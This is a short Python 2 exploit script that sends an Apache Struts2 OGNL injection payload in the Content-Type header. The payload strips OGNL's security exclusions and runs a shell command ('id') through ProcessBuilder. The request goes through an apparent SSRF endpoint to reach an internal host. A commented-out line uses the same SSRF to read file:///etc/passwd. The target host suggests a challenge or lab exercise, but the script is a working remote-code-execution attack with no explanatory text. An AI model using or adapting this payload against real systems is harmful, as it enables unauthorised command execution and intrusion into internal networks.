#!/usr/bin/python


from requests import *

payload = "%{(#_='multipart/form-data')."
payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload += "(#_memberAccess?"
payload += "(#_memberAccess=#dm):"
payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload += "(#ognlUtil.getExcludedPackageNames().clear())."
payload += "(#ognlUtil.getExcludedClasses().clear())."
payload += "(#context.setMemberAccess(#dm))))."
payload += "(#cmd='id')."
payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
payload += "(#p=new java.lang.ProcessBuilder(#cmds))."






payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload += "(#ros.flush())}"

headers = {'Content-Type': payload }

url = "http://ssrf.orange.tw:81/"

o = post( url , data = {'url':'http://172.20.0.6:8080/dqwdwqdw'} , headers = headers )
#o = post( url , data = {'url':'file:///etc/passwd'} )

print o.content